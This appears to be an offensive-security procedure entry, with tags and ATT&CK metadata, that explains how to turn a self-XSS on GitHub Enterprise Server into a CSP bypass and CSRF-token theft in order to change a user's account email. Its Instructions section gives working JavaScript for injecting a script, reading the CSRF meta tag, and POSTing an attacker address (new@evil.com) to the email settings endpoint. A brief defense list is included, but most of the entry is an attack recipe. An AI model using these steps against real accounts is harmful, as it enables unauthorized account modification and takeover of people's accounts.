---
tags:
  - csp-bypass
  - csrf
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - GitHub Enterprise Server
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.379Z'
sub_techniques: []
id: 8823b4c0-91e5-466c-be6e-11880c59aa66
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Bypass CSP and Perform Sensitive Actions

## Summary

This procedure uses the self-XSS to leverage on-site script gadgets for CSP evasion and CSRF token manipulation, enabling unauthorized account changes like email updates.

## Description

Once self-XSS is triggered, the injected script accesses GitHub's existing inline scripts or DOM elements as gadgets to avoid CSP blocks on external/inline JS. It extracts CSRF tokens and submits requests to sensitive endpoints. This chains the injection into impact, affecting the user's account without full takeover but requiring interaction.

## Requirements

1. Successful self-XSS execution from prior steps
2. Knowledge of GitHub's DOM structure (inspectable via dev tools)
3. Valid session for token extraction

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP without unsafe-inline allowances
- Tokenize and validate all state-changing requests
- Audit DOM manipulations and unusual fetch calls in session logs

## Objectives

1. Evade CSP using same-origin gadgets
2. Forge or steal CSRF tokens for API abuse
3. Execute account modifications

## Instructions

### Step 1: Inject Gadget Payload

**Context**: Use self-XSS to load a CSP-safe script via on-site elements.

In the prior payload, include: `<script>var s=document.createElement('script');s.innerHTML='your_gadget_code';document.body.appendChild(s);</script>` but adapt to use existing scripts, e.g., eval on a data attribute.

> Ensure payload uses only same-origin resources to bypass CSP.

### Step 2: Extract CSRF Token

**Context**: Grab the token from meta tags for authenticated requests.

Execute JS: `var token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');`

> Console log the token to verify; it should match the session's value.

### Step 3: Submit Malicious Request

**Context**: Perform the sensitive action using the token.

Use fetch: `fetch('/settings/emails', {method: 'POST', headers: {'X-CSRF-Token': token}, body: new URLSearchParams('email=new@evil.com')});`

> Check account settings post-execution to confirm change; no CSP violation occurs.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csp-bypass]]
- [[csrf]]
